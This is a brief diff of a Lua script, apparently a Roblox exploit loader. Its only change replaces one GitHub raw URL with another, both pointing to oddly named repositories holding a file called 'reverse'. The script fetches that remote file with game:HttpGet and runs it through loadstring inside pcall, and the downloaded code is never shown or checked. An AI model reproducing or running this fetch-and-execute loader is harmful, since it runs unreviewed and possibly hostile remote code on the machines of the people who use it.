@@ -1,7 +1,7 @@
 -- Wrap in pcall for error handling
 pcall(function()
     -- Load the remote script first
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/reverse"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/fe/refs/heads/main/Reverse"))()
 end)
 
 -- Ensure we're running in a local context
